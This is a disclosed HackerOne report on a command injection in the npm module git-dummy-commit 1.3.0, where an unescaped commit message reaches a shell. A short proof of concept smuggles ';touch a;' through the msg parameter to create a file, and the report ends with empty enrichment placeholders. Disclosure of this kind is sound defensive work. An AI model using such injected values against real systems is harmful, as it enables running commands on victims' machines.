---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '341710'
original_report_id: '341710'
title: '[git-dummy-commit] Command injection on the msg parameter'
weakness: OS Command Injection
team_handle: nodejs-ecosystem
created_at: '2018-04-22T03:26:03.610Z'
disclosed_at: '2018-06-15T21:59:11.029Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: git-dummy-commit
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- os-command-injection
---

# [git-dummy-commit] Command injection on the msg parameter

## Metadata

- HackerOne Report ID: 341710
- Weakness: OS Command Injection
- Program: nodejs-ecosystem
- Disclosed At: 2018-06-15T21:59:11.029Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi there, I've found a Command Injection on the "git-dummy-commit" module.

# Module

**module name:** git-dummy-commit
**version:** 1.3.0
**npm page:** https://www.npmjs.com/package/git-dummy-commit

## Module Description

> Create a dummy commit for testing

## Module Stats

[62] downloads in the last day
[94] downloads in the last week
[384] downloads in the last month
[6078]  downloads in the last year

# Vulnerability

## Vulnerability Description

The module appends the `msg` parameter to a command on the [line 37](https://github.com/stevemao/git-dummy-commit/blob/master/index.js#L37)  without escaping it, leading to a command injection.

## Steps To Reproduce:

* Install the module 

```
$ npm install git-dummy-commit
```

* Example code with the malicious payload `";touch a;"` on line 3.

```javascript
const gitDummyCommit = require('git-dummy-commit');

gitDummyCommit('";touch a;"');
```
* Run it.

```
$ node index.js
```

* Check the newly create file `a` 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `git` command.

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker that controls the `msg` parameter can injection command on the victim's machine.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
